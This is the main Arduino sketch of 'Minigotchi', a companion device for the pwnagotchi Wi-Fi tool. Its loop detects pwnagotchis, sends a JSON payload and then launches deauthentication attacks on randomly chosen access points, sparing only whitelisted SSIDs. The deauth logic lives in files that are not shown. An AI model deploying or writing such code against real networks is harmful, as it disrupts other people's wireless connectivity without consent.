// minigotchi.ino: everything implemented here

#include "pwnagotchi.h"
#include "deauth.h"
#include "packet.h"

Pwnagotchi pwnagotchi;
PacketSender packetSender;
DeauthAttack deauthAttack;

void setup() {
    Serial.begin(115200);
    Serial.println("Hi, I'm Minigotchi, your pwnagotchi's best friend!");
    Serial.println(" ");
    Serial.println("You can edit my whitelist in the minigotchi.ino, and you can also edit the json parameters in the packet.cpp");
    Serial.println(" ");
    deauthAttack.addToWhitelist("SSID"); // add your ssid(s) here
    deauthAttack.addToWhitelist("ANOTHER_SSID");
    delay(5000);
    Serial.println(" ");
    Serial.println("Starting now...");
}

void loop() {
    // get local payload from local pwnagotchi
    pwnagotchi.detectAndHandlePwnagotchi();
    delay(5000);

    // send payload
    packetSender.sendJsonPayload();
    delay(5000);

    // deauth a random ap
    deauthAttack.selectRandomAP();
    deauthAttack.startRandomDeauth();
    delay(5000);
}
